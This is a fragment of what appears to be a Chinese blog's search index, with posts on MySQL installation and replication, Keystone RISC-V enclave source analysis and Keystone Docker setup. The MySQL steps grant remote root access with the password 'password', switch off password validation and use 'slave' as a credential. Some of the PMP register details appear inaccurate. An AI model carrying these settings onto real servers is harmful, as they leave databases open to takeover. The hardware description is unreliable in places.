mysql</span><br></pre></td></tr></table></figure><h4 id="2-启动mysql"><a href="#2-启动mysql" class="headerlink" title="2.启动mysql"></a>2.启动mysql</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart mysqld</span><br><span class="line"><span class="comment">#启动mysql后mysql会自动初始化数据库</span></span><br></pre></td></tr></table></figure><h4 id="3-修改密码"><a href="#3-修改密码" class="headerlink" title="3.修改密码"></a>3.修改密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取密码</span></span><br><span class="line"><span class="built_in">tail</span> /var/log/mysqld.log</span><br></pre></td></tr></table></figure><p>mysq8.0开始默认启用了validate_password组件<br>    如果出现密码问题，可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#登录mysql（这里的密码通过上面步骤获取）</span></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="comment">#mariadb/mysql (适用于相对较新的版本)</span></span><br><span class="line">alter user<span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;新密码&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#mariadb（适用于相对较老的版本）</span></span><br><span class="line">UPDATE mysql.user SET password = PASSWORD(<span class="string">&#x27;root&#x27;</span>) WHERE user = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#刷新</span></span><br><span class="line">flush privileges</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启远程登录</span></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span> WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><p>如果出现修改密码不符合策略可以卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;validate_password%&#x27;</span>; <span class="comment">#查看密码策略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看validate_password plugin的状态</span></span><br><span class="line">SELECT PLUGIN_NAME, PLUGIN_STATUS FROM INFORMATION_SCHEMA.PLUGINS WHERE PLUGIN_NAME LIKE <span class="string">&#x27;validate%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装或者卸载组件</span></span><br><span class="line">UNINSTALL COMPONENT <span class="string">&#x27;file://component_validate_password&#x27;</span>;</span><br><span class="line">INSTALL COMPONENT <span class="string">&#x27;file://component_validate_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#mysql默认会加载validate_password component,但是不会加载validate_password plugin</span></span><br><span class="line">install plugin validate_password soname <span class="string">&#x27;validate_password.so&#x27;</span>;</span><br><span class="line">UNINSTALL PLUGIN  validate_password;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改mysql配置文件</span></span><br><span class="line">vim /etc/my.cnf</span><br><span class="line"><span class="comment">#加入以下两行</span></span><br><span class="line">validate_password.policy=LOW</span><br><span class="line">validate_password.length=0</span><br><span class="line">validate_password.check_user_name=OFF</span><br><span class="line"><span class="comment">#这个用于关闭密码和用户名一样的时候密码不通过。（这些参数依赖与vaildate_password component)</span></span><br><span class="line"></span><br><span class="line">validate_password.number_count + validate_password.special_char_count + (2 * validate_password.mixed_case_count)</span><br></pre></td></tr></table></figure><h2 id="2-mysql配置主从复制"><a href="#2-mysql配置主从复制" class="headerlink" title="2.mysql配置主从复制"></a>2.mysql配置主从复制</h2><h5 id="2-1-mysql主从复制的原理"><a href="#2-1-mysql主从复制的原理" class="headerlink" title="2.1 mysql主从复制的原理"></a>2.1 mysql主从复制的原理</h5><ul><li>1.mysql主库将数据的更改记录记录到二进制日志(binary log)中</li><li>2.mysql从库将主库的更改记录的二进制日志同步到本地的中继日志(relay log)</li><li>3.mysql从库读取中继日志,根据日志中的操作步骤,同步数据</li></ul><h5 id="2-2-配置主库"><a href="#2-2-配置主库" class="headerlink" title="2.2 配置主库"></a>2.2 配置主库</h5><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server-id=1</span><br><span class="line">log-bin=localhost-binlog<span class="comment">#日志文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#需要同步的表，不配置默认同步所有数据库</span></span><br><span class="line">binlog-do-db=db_a</span><br><span class="line">binlog-do-db=db_b</span><br><span class="line">binlog-do-db=db_c</span><br></pre></td></tr></table></figure><p>创建从复制的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建slave用户</span></span><br><span class="line">create user slave@<span class="string">&#x27;%&#x27;</span> identified with mysql_native_password by <span class="string">&#x27;slave&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="2-3-配置从库"><a href="#2-3-配置从库" class="headerlink" title="2.3 配置从库"></a>2.3 配置从库</h5><p>修改serverid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server-id=2</span><br><span class="line"><span class="comment">#这个server-id要和主库不一样</span></span><br></pre></td></tr></table></figure><p>修改要复制的数据库的地址以及验证信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change master to </span><br><span class="line">master_host=<span class="string">&#x27;172.17.0.4&#x27;</span>,</span><br><span class="line">master_port=3306,</span><br><span class="line">master_user=<span class="string">&#x27;slave&#x27;</span>,</span><br><span class="line">master_password=<span class="string">&#x27;slave&#x27;</span>,</span><br><span class="line">master_log_file=<span class="string">&#x27;logbin.000002&#x27;</span>,</span><br><span class="line">master_log_pos=1825;<span class="comment">#这个参数可以由主库show master status得到</span></span><br></pre></td></tr></table></figure><p>开始复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start slave</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>keystone框架分析</title>
      <link href="/2023/05/04/keystone%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/04/keystone%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="1-RISC-V的PMP权限"><a href="#1-RISC-V的PMP权限" class="headerlink" title="1.RISC-V的PMP权限"></a>1.RISC-V的PMP权限</h3><p>RISC-V PMP（Physical Memory Protection）是一种硬件保护机制，用于保护处理器的物理内存免受非授权访问。它可以为每个特权级别和每个地址范围设置访问权限，从而提供更细粒度的内存保护。  </p><h4 id="1-1-PMP机制"><a href="#1-1-PMP机制" class="headerlink" title="1.1 PMP机制"></a>1.1 PMP机制</h4><ol><li><p>地址匹配模式<br>PMP支持两种地址匹配模式：地址范围和地址匹配。地址范围模式允许设置一段地址范围的访问权限，而地址匹配模式则允许设置具体地址的访问权限。  </p></li><li><p>访问权限<br>PMP支持4种访问权限：读、写、执行和访问控制。访问控制权限用于控制对PMP寄存器的访问，只有特权级别为M级别的代码才能访问PMP寄存器。  </p></li><li><p>特权级别<br>PMP可以为每个特权级别设置不同的访问权限。RISC-V支持3个特权级别：M级别（最高特权级别）、S级别（次高特权级别）和U级别（用户特权级别）。  </p></li><li><p>PMP寄存器<br>PMP机制通过PMP寄存器来实现。RISC-V架构中有16个PMP寄存器，每个寄存器可以设置一段地址范围的访问权限。PMP寄存器包括以下字段：</p></li></ol><ul><li>PMPADDR：地址范围的起始地址。  </li><li>PMPADDRLEN：地址范围的长度。  </li><li>PMPCFG：访问权限和地址匹配模式。</li></ul><ol start="5"><li>PMP配置<br>PMP配置指的是将PMP寄存器中的配置信息加载到处理器中。在RISC-V中，PMP配置可以通过以下方式实现：</li></ol><ul><li>1.在处理器启动时，将PMP寄存器中的配置信息加载到处理器中。  </li><li>2.在程序运行时，通过特定的指令将PMP寄存器中的配置信息加载到处理器中。</li></ul><h4 id="1-2-PMP-权限控制"><a href="#1-2-PMP-权限控制" class="headerlink" title="1.2 PMP 权限控制"></a>1.2 PMP 权限控制</h4><p>PMP 权限控制分为以下几个权限</p><ul><li>1.S-mode (Supervisor特权权限)<br> 次最高用户权限，权限仅次于machine，系统的驱动，以及内核都运行再这一用户权限</li><li>2.U-mode(User用户权限)<br>  最低的用户权限，用户的应用程序一般都运行再这一层</li><li>3.M-mode(Machine,系统权限)</li><li>最高的用户权限，bootloader，firmware等都运行在这一用户权限<br>其中，M（machine mode）可以访问全部的地址。为了禁止不可信的代码执行特权指令，引入了U（User mode）。为了限制不可信的代码使其只能访问自己的那部分内存，处理器可以提供一个物理内存保护（PMP，Physical Memory Protection）功能，以提供在各种模式下的内存保护。</li></ul><p>总之，PMP机制是一种硬件保护机制，用于保护处理器的物理内存免受非授权访问。它可以为每个特权级别和每个地址范围设置访问权限，从而提供更细粒度的内存保护。</p><h4 id="1-3-源码分析"><a href="#1-3-源码分析" class="headerlink" title="1.3 源码分析"></a>1.3 源码分析</h4><p><strong>keystone关于PMP的源码分析</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pmp_region</span> //<span class="title">pmp</span>结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">uint64_t</span> size;</span><br><span class="line"><span class="type">uint8_t</span> addrmode;</span><br><span class="line"><span class="type">uintptr_t</span> addr;</span><br><span class="line"><span class="type">int</span> allow_overlap;</span><br><span class="line"><span class="type">int</span> reg_idx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pmp_set_keystone</span><span class="params">(<span class="type">int</span> region_idx,<span class="type">uint8_t</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line">.....</span><br><span class="line"><span class="type">uint8_t</span> perm_bits = perm &amp; PMP_ALL_PERM;</span><br><span class="line">pmpreg_id reg_idx = region_register_idx(region_idx);</span><br><span class="line"><span class="type">uintptr_t</span> pmpcfg = region_pmpcfg_val(region_idx,reg_idx,perm_bits);<span class="comment">//PMP配置寄存器</span></span><br><span class="line"><span class="type">uintptr_t</span> pmpaddr;</span><br><span class="line">pmpaddr = region_pmpaddr_val(region_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看出pmp_set_keystone干了几件事</p><ul><li>1.pmp_set_keystone函数通过传进的perm参数计算实际需要设置的perm参数</li><li>2.根据传入的region_idx对应的 pmp_region对应结构体的信息，计算需要写入PMP条目的PMP配置寄存器和PMP地址寄存器的值。</li></ul><h3 id="2-Keystone运行机制"><a href="#2-Keystone运行机制" class="headerlink" title="2.Keystone运行机制"></a>2.Keystone运行机制</h3><p>一个简单的demo程序一般由两个程序构成</p><ul><li>1.host程序，作为enclave的runtime，其中内存分配以及内存映射都是通过host程序进行系统调用实现</li><li>2.eapp程序，作为实际运行的程序，依靠host程序作为runtime<br>一个简单的demo<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#host.cpp</span></span><br><span class="line"><span class="comment">//******************************************************************************</span></span><br><span class="line"><span class="comment">// Copyright (c) 2018, The Regents of the University of California (Regents).</span></span><br><span class="line"><span class="comment">// All Rights Reserved. See LICENSE for license details.</span></span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;edge/edge_call.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;host/keystone.h&quot;</span></span></span><br><span class="line">using namespace Keystone;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  Enclave enclave;</span><br><span class="line">  Params params;</span><br><span class="line">  params.setFreeMemSize(<span class="number">1024</span> * <span class="number">1024</span>);<span class="comment">//申请空间</span></span><br><span class="line">  params.setUntrustedMem(DEFAULT_UNTRUSTED_PTR, <span class="number">1024</span> * <span class="number">1024</span>); <span class="comment">//设置eapp的内存地址</span></span><br><span class="line">  enclave.init(argv[<span class="number">1</span>], argv[<span class="number">2</span>], params); <span class="comment">//初始化enclave</span></span><br><span class="line">  enclave.registerOcallDispatch(incoming_call_dispatch);</span><br><span class="line">  edge_call_init_internals(</span><br><span class="line">      (<span class="type">uintptr_t</span>)enclave.getSharedBuffer(), enclave.getSharedBufferSize());</span><br><span class="line">  enclave.run(); <span class="comment">//启动enclave</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello, world!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据官方文档介绍</p><p>一个enclave程序首先有一个连续的物理地址范围，成为EPM(enclave private memory)，不受信任的主机要运行enclave程序首先申请分配EPM,并用PT(page table) 和RT(Runtime table)进行初始化epm，一旦主机调用SM创建一个enclave，SM(security monitory) 就会使用PMP保护EPM，并对EPM进行权限控制，并且PMP都是通过内核进行传递再创建成功之后，SM将会对enclave初始化状态进行验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enclave.run --&gt;keystone_run_enclave --&gt;sbi_sm_run_enclave</span><br></pre></td></tr></table></figure><p>我们首先看run函数执行了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">KeystoneDevice::__run(<span class="type">bool</span> resume, <span class="type">uintptr_t</span>* ret) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">keystone_ioctl_run_enclave</span> <span class="title">encl</span>;</span></span><br><span class="line">  encl.eid = eid;</span><br><span class="line">  Error error;</span><br><span class="line">  <span class="type">uint64_t</span> request;</span><br><span class="line">  <span class="keyword">if</span> (resume) &#123;</span><br><span class="line">    error   = Error::IoctlErrorResume;</span><br><span class="line">    request = KEYSTONE_IOC_RESUME_ENCLAVE;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    error   = Error::IoctlErrorRun;</span><br><span class="line">    request = KEYSTONE_IOC_RUN_ENCLAVE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, request, &amp;encl)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们发现run中调用了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">keystone_fops</span> =</span> &#123;</span><br><span class="line">    .owner          = THIS_MODULE,</span><br><span class="line">    .mmap           = keystone_mmap,</span><br><span class="line">    .unlocked_ioctl = keystone_ioctl,</span><br><span class="line">    .release        = keystone_release</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着看ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">keystone_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filep, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> ret;</span><br><span class="line">  <span class="type">char</span> data[<span class="number">512</span>];</span><br><span class="line">  <span class="type">size_t</span> ioc_size;</span><br><span class="line">  <span class="keyword">if</span> (!arg)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  ioc_size = _IOC_SIZE(cmd);</span><br><span class="line">  ioc_size = ioc_size &gt; <span class="keyword">sizeof</span>(data) ? <span class="keyword">sizeof</span>(data) : ioc_size;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(data,(<span class="type">void</span> __user *) arg, ioc_size))</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_CREATE_ENCLAVE:</span><br><span class="line">      ret = keystone_create_enclave(filep, (<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_FINALIZE_ENCLAVE:</span><br><span class="line">      ret = keystone_finalize_enclave((<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_DESTROY_ENCLAVE:</span><br><span class="line">      ret = keystone_destroy_enclave(filep, (<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_RUN_ENCLAVE:</span><br><span class="line">      ret = keystone_run_enclave((<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_RESUME_ENCLAVE:</span><br><span class="line">      ret = keystone_resume_enclave((<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">/* Note that following commands could have been implemented as a part of ADD_PAGE ioctl.</span></span><br><span class="line"><span class="comment">     * However, there was a weird bug in compiler that generates a wrong control flow</span></span><br><span class="line"><span class="comment">     * that ends up with an illegal instruction if we combine switch-case and if statements.</span></span><br><span class="line"><span class="comment">     * We didn&#x27;t identified the exact problem, so we&#x27;ll have these until we figure out */</span></span><br><span class="line">    <span class="keyword">case</span> KEYSTONE_IOC_UTM_INIT:</span><br><span class="line">      ret = utm_init_ioctl(filep, (<span class="type">unsigned</span> <span class="type">long</span>) data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> -ENOSYS;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (copy_to_user((<span class="type">void</span> __user*) arg, data, ioc_size))</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看enclave_run_enclave函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">keystone_run_enclave</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sbiret</span> <span class="title">ret</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ueid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">enclave</span>* <span class="title">enclave</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">keystone_ioctl_run_enclave</span> *<span class="title">arg</span> =</span> (<span class="keyword">struct</span> keystone_ioctl_run_enclave*) data;</span><br><span class="line">  ueid = arg-&gt;eid;</span><br><span class="line">  enclave = get_enclave_by_id(ueid);</span><br><span class="line">  <span class="keyword">if</span> (!enclave) &#123;</span><br><span class="line">    keystone_err(<span class="string">&quot;invalid enclave id\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (enclave-&gt;eid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    keystone_err(<span class="string">&quot;real enclave does not exist\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = sbi_sm_run_enclave(enclave-&gt;eid);</span><br><span class="line">  arg-&gt;error = ret.error;</span><br><span class="line">  arg-&gt;value = ret.value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看一下sbi_sm_run_enclave函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sbi_sm_run_enclave</span><span class="params">((<span class="keyword">struct</span> sbi_trap_regs *)regs,<span class="type">unsigned</span> <span class="type">long</span> eid)</span></span><br><span class="line">&#123;</span><br><span class="line">regs-&gt;a0 = run_enclave(regs,(<span class="type">unsigned</span> <span class="type">int</span>)eid);</span><br><span class="line">regs-&gt;mepc += <span class="number">4</span>;</span><br><span class="line">sbi_trap_exit(regs);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pmp_set<br>这里我们可以清楚的看到，sbi_sm_run_enclave函数先是调用了run_enclave函数，然后将返回结果存储到a0,然后调用sbi_trap_exit(regs)函数返回，因此我们这里基本可以推测，eapp程序是作为host程序中的一个中断程序。<br>run_enclave中，完成以下操作：<br>1.修改寄存器组的值，对应需要run的那个enclave，并且把当前的寄存器组的值保存起来，（就像函数调用或者中断一样，调用函数或者执行中断函数首先需要保留现场，以便于执行完成之后可以正确的返回）</p><p>2.翻转pmp的权限。<br>每个eapp拥有自己的运行权限，由于host程序最终要运行到eapp，因此这里通过反转pmp权限实现控制eapp的运行权限，可以这么理解，eapp的运行环境是host程序创建的，因此eapp运行之前需要通过host进行初始化。</p><p>3。保存一些信息，用于之后的一些操作，例如检查之类的。比如保存当前的hart（硬件线程）对应的eid，以及是否在enclave中，用于之后的操作。</p><p>4.sbi_trap_exit:<br>这函数调用了opensbi的接口，功能是执行中断，并且重新加载寄存器组regs。<br>因为在之前的函数中修改了寄存器组regs，配套到了eapp，所以执行完这个之后，执行流就到了eapp当中。</p><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/139695407">https://zhuanlan.zhihu.com/p/139695407</a><br><a href="https://www.cnblogs.com/bows7ring/p/14775208.html">https://www.cnblogs.com/bows7ring/p/14775208.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>keystone</title>
      <link href="/2023/04/21/keystone/"/>
      <url>/2023/04/21/keystone/</url>
      
        <content type="html"><![CDATA[<h1 id="keystone"><a href="#keystone" class="headerlink" title="keystone"></a>keystone</h1><h3 id="1-搭建keystone开发环境"><a href="#1-搭建keystone开发环境" class="headerlink" title="1.搭建keystone开发环境"></a>1.搭建keystone开发环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载镜像</span></span><br><span class="line">docker pull keystoneenclaveorg/keystone:master</span><br></pre></td></tr></table></figure><h3 id="2-进入到keystone开发环境"><a href="#2-进入到keystone开发环境" class="headerlink" title="2.进入到keystone开发环境"></a>2.进入到keystone开发环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --entrypoint /bin/bash keystoneenclaveorg/keystone:master</span><br></pre></td></tr></table></figure><h3 id="3-配置好开发工具链"><a href="#3-配置好开发工具链" class="headerlink" title="3.配置好开发工具链"></a>3.配置好开发工具链</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /keystone</span><br><span class="line"><span class="built_in">source</span> source.sh</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line"><span class="comment">#编译测试模块</span></span><br><span class="line">make run-tests</span><br></pre></td></tr></table></figure><h3 id="4-编译模块"><a href="#4-编译模块" class="headerlink" title="4. 编译模块"></a>4. 编译模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换到构建目录</span></span><br><span class="line"><span class="built_in">cd</span> /keystone/build</span><br><span 